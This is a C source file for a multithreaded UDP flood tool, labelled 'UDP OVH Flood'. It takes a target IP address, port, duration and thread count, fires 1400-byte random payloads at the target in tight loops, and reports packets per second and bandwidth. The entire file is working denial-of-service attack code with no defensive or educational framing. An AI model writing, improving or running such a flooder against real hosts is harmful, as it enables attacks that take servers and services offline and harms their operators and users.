// udp_ovh_fixed.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define PAYLOAD_SIZE 1400

volatile int running = 1;
volatile long packet_count = 0;

typedef struct {
    char ip[64];
    int port;
    int duration;
} flood_args_t;

void generate_static_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

void* flood_thread(void* arg) {
    flood_args_t* args = (flood_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    char payload[PAYLOAD_SIZE];
    generate_static_payload(payload, PAYLOAD_SIZE); // Random 1 lần duy nhất

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &target.sin_addr);

    while (running) {
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&target, sizeof(target));
        __sync_fetch_and_add(&packet_count, 1);
    }

    close(sock);
    pthread_exit(NULL);
}

void* monitor_thread(void* arg) {
    (void)arg;
    while (running) {
        sleep(1);
        long count = __sync_fetch_and_and(&packet_count, 0);
        double mbps = (count * PAYLOAD_SIZE * 8) / 1e6;
        printf("[+] PPS: %ld | Bandwidth: %.2f Mbps\n", count, mbps);
    }
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t tid[threads], monitor;
    flood_args_t args;
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.port = port;
    args.duration = duration;

    pthread_create(&monitor, NULL, monitor_thread, NULL);
    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood_thread, &args);
        usleep(100);
    }

    sleep(duration);
    running = 0;

    for (int i = 0; i < threads; i++) pthread_join(tid[i], NULL);
    pthread_join(monitor, NULL);

    printf("==> UDP OVH Flood finished.\n");
    return 0;
}
